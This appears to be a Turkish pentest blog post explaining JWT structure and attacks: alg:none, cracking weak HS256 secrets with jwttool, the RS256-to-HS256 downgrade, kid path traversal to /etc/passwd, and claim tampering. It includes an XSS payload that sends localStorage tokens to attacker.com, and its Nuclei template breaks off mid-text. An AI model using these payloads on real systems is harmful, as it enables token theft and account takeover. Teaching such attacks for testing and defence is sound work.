<!DOCTYPE html>
<html lang="tr"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">JWT Saldırı Teknikleri | Alperen Keskin</title>
<meta property="og:title" content="JWT Saldırı Teknikleri | Alperen Keskin" />
<meta name="twitter:title" content="JWT Saldırı Teknikleri | Alperen Keskin" />
<meta itemprop="name" content="JWT Saldırı Teknikleri | Alperen Keskin" />
<meta name="application-name" content="JWT Saldırı Teknikleri | Alperen Keskin" />
<meta property="og:site_name" content="Alperen Keskin Blog" />

<meta name="description" content="JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri.">
<meta itemprop="description" content="JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri." />
<meta property="og:description" content="JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri." />
<meta name="twitter:description" content="JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri." />

<meta property="og:locale" content="tr" />
<meta name="language" content="tr" />

  <link rel="alternate" hreflang="tr" href="https://alperenkesk.github.io/posts/pentest-teknikleri/jwt-saldirilari/" title="Türkçe" />





    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2025-12-11T00:00:00Z />
    <meta property="article:published_time" content=2025-12-11T00:00:00Z />
    <meta property="og:url" content="https://alperenkesk.github.io/posts/pentest-teknikleri/jwt-saldirilari/" />

    
    <meta property="og:article:author" content="Alperen Keskin" />
    <meta property="article:author" content="Alperen Keskin" />
    <meta name="author" content="Alperen Keskin" />
    
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "JWT Saldırı Teknikleri",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2025-12-11",
        "description": "JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri.",
        "wordCount":  904 ,
        "mainEntityOfPage": "True",
        "dateModified": "2025-12-11",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "Alperen Keskin"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.147.8">

    
    <meta property="og:url" content="https://alperenkesk.github.io/posts/pentest-teknikleri/jwt-saldirilari/">
  <meta property="og:site_name" content="Alperen Keskin">
  <meta property="og:title" content="JWT Saldırı Teknikleri">
  <meta property="og:description" content="JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri.">
  <meta property="og:locale" content="tr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-12-11T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-12-11T00:00:00+00:00">
    <meta property="article:tag" content="Jwt">
    <meta property="article:tag" content="Siber-Güvenlik">
    <meta property="article:tag" content="Pentest">
    <meta property="article:tag" content="Bug-Bounty">
    <meta property="article:tag" content="Web-Güvenliği">


    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="JWT Saldırı Teknikleri">
  <meta name="twitter:description" content="JWT yapısı, algoritmaları, güvenlik zafiyetleri ve saldırı teknikleri.">


    

    <link rel="canonical" href="https://alperenkesk.github.io/posts/pentest-teknikleri/jwt-saldirilari/">
    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://alperenkesk.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-2JM75S6REN"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-2JM75S6REN');
        }
      </script>
    
</head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://alperenkesk.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Anasayfa
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Yazılar
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/pages/about/">
                        Hakkımda
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">JWT Saldırı Teknikleri</h1>
                
                
                
                <div class="post-meta">
                    <time datetime="2025-12-11T00:00:00&#43;00:00" itemprop="datePublished"> 11 Ara 2025 </time>
                </div>
                
            </header>
            
    
    <details class="toc" ZgotmplZ>
        <summary><b></b></summary>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#1-jwt-nedir--temel-yapı">1. JWT Nedir? – Temel Yapı</a></li>
    <li><a href="#2-jwt-yapısı">2. JWT Yapısı</a>
      <ul>
        <li><a href="#21-header">2.1 Header</a></li>
        <li><a href="#22-payload-claims">2.2 Payload (Claims)</a></li>
        <li><a href="#23-signature">2.3 Signature</a></li>
      </ul>
    </li>
    <li><a href="#3-jwt-algoritmaları">3. JWT Algoritmaları</a></li>
    <li><a href="#4-jwt-saldırıları">4. JWT Saldırıları</a>
      <ul>
        <li><a href="#41-alg-none-saldırısı">4.1 “alg: none” Saldırısı</a></li>
        <li><a href="#42-zayıf-secret-key-brute-force-hs256">4.2 Zayıf Secret Key Brute-Force (HS256)</a></li>
        <li><a href="#43-rs256--hs256-downgrade-saldırısı-public-key-abuse">4.3 RS256 → HS256 Downgrade Saldırısı (Public Key Abuse)</a></li>
        <li><a href="#44-kid-parametresi-ile-file-inclusion--key-manipülasyonu">4.4 kid Parametresi ile File Inclusion / Key Manipülasyonu</a></li>
        <li><a href="#45-token-manipülasyonu-ile-role-elevation">4.5 Token Manipülasyonu ile Role Elevation</a></li>
        <li><a href="#46-exp-manipülasyonu-ile-süresiz-token">4.6 exp Manipülasyonu ile Süresiz Token</a></li>
        <li><a href="#47-jwt-çalma-xss--localstorage">4.7 JWT Çalma (XSS + LocalStorage)</a></li>
        <li><a href="#48-refresh-token-abuse--sonsuz-login-zombie-session">4.8 Refresh Token Abuse – Sonsuz Login (Zombie Session)</a></li>
      </ul>
    </li>
    <li><a href="#5-otomasyon-için-nuclei-template-algnone--hs256-brute-force">5. Otomasyon için Nuclei Template (alg:none + HS256 brute-force)</a></li>
    <li><a href="#sonuç">Sonuç</a></li>
  </ul>
</nav>
    </details>
            <div class="page-content">
                <p>Bu yazıda JWT’nin temel yapısını, algoritmalarını ve gerçek dünyada pentester’lar tarafından en çok kullanılan saldırı tekniklerini ayrıntılarıyla ele alıyoruz.</p>
<p>JSON Web Token (JWT), modern web uygulamalarında kimlik doğrulama ve yetkilendirme için kullanılan, stateless ve taşınabilir bir standarttır. Doğru yapılandırıldığında etkili bir kimlik doğrulama mekanizması sunar ama yanlış uygulandığında kritik güvenlik açıklarına yol açabilir.</p>
<h2 id="1-jwt-nedir--temel-yapı">1. JWT Nedir? – Temel Yapı</h2>
<p>JWT, kimliği doğrulanmış kullanıcıya sunucu tarafından verilen imzalı bir kimlik tokenıdır. “Stateless” olduğundan, kullanıcı her istekte token’ı header içinde taşır:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Authorization: Bearer &lt;JWT&gt;
</span></span></span></code></pre></div><p>JWT üç bölümden oluşur:</p>
<p><code>HEADER.PAYLOAD.SIGNATURE</code></p>
<p>Her bölüm Base64URL ile encode edilir (şifreli değildir).</p>
<h2 id="2-jwt-yapısı">2. JWT Yapısı</h2>
<h3 id="21-header">2.1 Header</h3>
<p>Header, token’ın türünü ve kullanılan imza algoritmasını belirtir:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="22-payload-claims">2.2 Payload (Claims)</h3>
<p>Kullanıcıya ait bilgiler ve token metadata’sı burada bulunur.</p>
<blockquote>
<p>Payload şifreli değildir sadece encode edilir. Herkes okuyabilir.</p></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;4521&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;user&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;exp&#34;</span><span class="p">:</span> <span class="mi">1721340000</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="23-signature">2.3 Signature</h3>
<p>Token’ın manipüle edilmesini engelleyen kriptografik imzadır:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HMACSHA256(
</span></span><span class="line"><span class="cl">  base64UrlEncode(header) + &#34;.&#34; + base64UrlEncode(payload),
</span></span><span class="line"><span class="cl">  secret_key
</span></span><span class="line"><span class="cl">)
</span></span></code></pre></div><h2 id="3-jwt-algoritmaları">3. JWT Algoritmaları</h2>
<p>JWT iki ana algoritma ailesi kullanır:</p>
<ul>
<li><strong>Simetrik (HS256 / HS384 / HS512)</strong>
<ul>
<li>Tek bir secret key kullanılır</li>
<li>Hızlıdır</li>
<li>Secret sızarsa tüm tokenlar tehlikededir</li>
</ul>
</li>
<li><strong>Asimetrik (RS256 / ES256)</strong>
<ul>
<li>Private key → imza</li>
<li>Public key → doğrulama</li>
<li>Büyük sistemlerde daha güvenli</li>
<li>Yanlış yapılandırıldığında RS256 → HS256 downgrade saldırısı mümkündür</li>
</ul>
</li>
</ul>
<h2 id="4-jwt-saldırıları">4. JWT Saldırıları</h2>
<p>Aşağıdaki saldırılar pentest ve bug bounty ortamlarında en sık görülen zafiyetlerdir.</p>
<h3 id="41-alg-none-saldırısı">4.1 “alg: none” Saldırısı</h3>
<p><strong>Amaç:</strong> İmza doğrulamasını tamamen devre dışı bırakmak.</p>
<p><strong>Orijinal header:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span> <span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span> <span class="p">}</span>
</span></span></code></pre></div><p><strong>Saldırgan değiştirir:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;none&#34;</span><span class="p">,</span> <span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span> <span class="p">}</span>
</span></span></code></pre></div><p><strong>Token şu şekilde gönderilir:</strong>
<code>HEADER.PAYLOAD.</code></p>
<p><strong>Sonuç:</strong> Uygulama imza kontrolü yapmaz → saldırgan kendini admin yapabilir.</p>
<h3 id="42-zayıf-secret-key-brute-force-hs256">4.2 Zayıf Secret Key Brute-Force (HS256)</h3>
<p>Yetersiz anahtar karmaşıklığı nedeniyle çevrimdışı (offline) saldırılara açık en yaygın yapılandırma hatası.</p>
<p><strong>Secret Key Kaba Kuvvet Saldırsı:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ jwttool -t eyJhbGci... -w rockyou.txt --crack
</span></span></code></pre></div><p><strong>Secret ele geçirildikten sonra sahte admin tokenı oluşturma:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ jwttool -S -p <span class="s1">&#39;{&#34;role&#34;:&#34;admin&#34;}&#39;</span> -s secret123
</span></span></code></pre></div><p><strong>Sonuç:</strong> Tüm kullanıcılar adına sahte token üretilebilir.</p>
<h3 id="43-rs256--hs256-downgrade-saldırısı-public-key-abuse">4.3 RS256 → HS256 Downgrade Saldırısı (Public Key Abuse)</h3>
<p>Bu saldırı, sunucunun kafasını karıştırarak <strong>herkese açık olan Public Key&rsquo;i</strong>, gizli bir <strong>Secret Key gibi kullanmasını</strong> sağlamaktır.</p>
<p><strong>Mantık:</strong></p>
<ol>
<li>Saldırgan, token başlığındaki <code>RS256</code> (Asimetrik) algoritmasını <code>HS256</code> (Simetrik) olarak değiştirir.</li>
<li>Sunucu başlıkta <code>HS256</code> gördüğü için, elindeki Public Key dosyasını doğrulama için bir &ldquo;HMAC şifresi&rdquo; olarak kullanmaya başlar.</li>
<li>Saldırgan da aynı Public Key&rsquo;i indirir ve onu bir şifre gibi kullanarak kendi sahte token&rsquo;ını imzalar. İki taraf da aynı anahtarı kullandığı için token geçerli olur.</li>
</ol>
<p><strong>Manipüle Edilmiş Header:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span> <span class="c1">// RS256 yerine HS256&#39;ya zorla
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nt">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>PoC:</strong>
Public Key dosyasını sanki bir parola (secret key) gibi kullanarak imza atıyoruz:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ jwttool -S -p <span class="s1">&#39;{&#34;role&#34;:&#34;admin&#34;}&#39;</span> --hs256 --key public.pem
</span></span></code></pre></div><p><strong>Sonuç:</strong> Sunucu kendi Public Key&rsquo;ini şifre sandığı için, aynı &ldquo;şifreyle&rdquo; imzalanmış sahte token&rsquo;ı kabul eder.</p>
<h3 id="44-kid-parametresi-ile-file-inclusion--key-manipülasyonu">4.4 kid Parametresi ile File Inclusion / Key Manipülasyonu</h3>
<p><strong>Header:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;main&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Zafiyetli backend:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">key</span> <span class="o">=</span> <span class="nx">readFile</span><span class="p">(</span><span class="s2">&#34;/keys/&#34;</span> <span class="o">+</span> <span class="nx">kid</span><span class="p">)</span>
</span></span></code></pre></div><p><strong>Saldırı:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;../../../../../../etc/passwd&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Token imzalama PoC:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ jwttool -S --key /etc/passwd
</span></span></code></pre></div><p><strong>Sonuç:</strong></p>
<ul>
<li>Key injection</li>
<li>Signature bypass</li>
</ul>
<h3 id="45-token-manipülasyonu-ile-role-elevation">4.5 Token Manipülasyonu ile Role Elevation</h3>
<p><strong>Orijinal payload:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;4512&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Saldırgan değiştirir:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;4512&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Sonuç:</strong> Eğer imza doğrulaması doğru yapılmıyorsa → Admin yetkisi erişimi.</p>
<h3 id="46-exp-manipülasyonu-ile-süresiz-token">4.6 exp Manipülasyonu ile Süresiz Token</h3>
<p><strong>Orijinal:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;exp&#34;</span><span class="p">:</span> <span class="mi">1721340000</span> <span class="p">}</span>
</span></span></code></pre></div><p><strong>Manipüle edilmiş payload:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;exp&#34;</span><span class="p">:</span> <span class="mi">9999999999</span> <span class="p">}</span>
</span></span></code></pre></div><p><strong>Sonuç:</strong> Bazı zayıf backend’ler exp kontrolü yapmadığı için token süresiz geçerli olur.</p>
<h3 id="47-jwt-çalma-xss--localstorage">4.7 JWT Çalma (XSS + LocalStorage)</h3>
<p><strong>Sorun:</strong> Geliştiricilerin JWT&rsquo;yi <code>LocalStorage</code> içinde saklaması. <code>LocalStorage</code>, sayfada çalışan herhangi bir JavaScript kodu tarafından okunabilir. Eğer sitede <strong>XSS</strong> zafiyeti varsa, saldırgan tek satırlık kodla token&rsquo;ı çalar.</p>
<p><strong>Zafiyetli Saklama (Frontend):</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// Yanlış: Token JavaScript tarafından erişilebilir durumda
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">,</span> <span class="s2">&#34;eyJhbGciOi...&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p><strong>Saldırı PoC (XSS Payload):</strong>
Saldırgan, bir yorum alanına veya URL parametresine şu kodu gömer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Token&#39;ı al ve saldırganın sunucusuna gönder
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;[https://attacker.com/log?token=](https://attacker.com/log?token=)&#39;</span> <span class="o">+</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><strong>Sonuç:</strong> Token saldırganın sunucusuna düşer ve saldırgan parolaya ihtiyaç duymadan hesabı ele geçirir (Session Hijacking).</p>
<h3 id="48-refresh-token-abuse--sonsuz-login-zombie-session">4.8 Refresh Token Abuse – Sonsuz Login (Zombie Session)</h3>
<p>Refresh Token, kullanıcıya tekrar tekrar şifre sormamak için kullanılan uzun ömürlü bir anahtardır. Eğer bu anahtar çalınırsa ve gerekli güvenlik önlemleri (IP Binding, Rotation) yoksa, saldırgan parolaya ihtiyaç duymadan uzun süre hesapta kalabilir.</p>
<p><strong>Zafiyetin Nedenleri:</strong></p>
<ol>
<li><strong>IP&rsquo;ye Bağlı Değilse:</strong> Token Türkiye&rsquo;de oluşturulup Almanya&rsquo;dan kullanılıyorsa sunucu bunu reddetmelidir. Etmiyorsa, token her yerden kullanılabilir.</li>
<li><strong>Blacklist Yoksa:</strong> Kullanıcı &ldquo;Çıkış Yap&rdquo; dediğinde veya şifresini değiştirdiğinde, sunucu eski Refresh Token&rsquo;ı veritabanında &ldquo;iptal edildi&rdquo; olarak işaretlemezse, çalınan token çalışmaya devam eder.</li>
<li><strong>Token Rotation Yoksa:</strong> Refresh Token her kullanıldığında değişmelidir. Eğer sabit kalıyorsa, çalındığı an güvenlik zafiyet oluşturabilir.</li>
</ol>
<p><strong>Senaryo:</strong></p>
<ol>
<li>Saldırgan kullanıcının Refresh Token&rsquo;ını çalar.</li>
<li>Kullanıcı parolasını değiştirse bile, saldırgan elindeki token ile sürekli <strong>yeni Access Token</strong> üretir.</li>
<li>Saldırgan, kullanıcı fark etmeden hesabı arka planda kullanmaya devam eder.</li>
</ol>
<p><strong>Sonuç:</strong> &ldquo;Account Takeover&rdquo; (Hesap Ele Geçirme). Saldırganın oturumu, sunucu manuel olarak o tokenı silene kadar asla düşmez.</p>
<h2 id="5-otomasyon-için-nuclei-template-algnone--hs256-brute-force">5. Otomasyon için Nuclei Template (alg:none + HS256 brute-force)</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l">jwt-basic-checks</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">info</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">JWT Security Checks</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l">high</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="l">jwt,auth,bypass</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">requests</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">GET</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">path</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;{{BaseURL}}&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">extractors</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">regex</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">jwt</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">regex</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="s2">&#34;eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]*&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">GET</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">path</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="s2">&#34;{{BaseURL}}&#34;</span><span class="w">
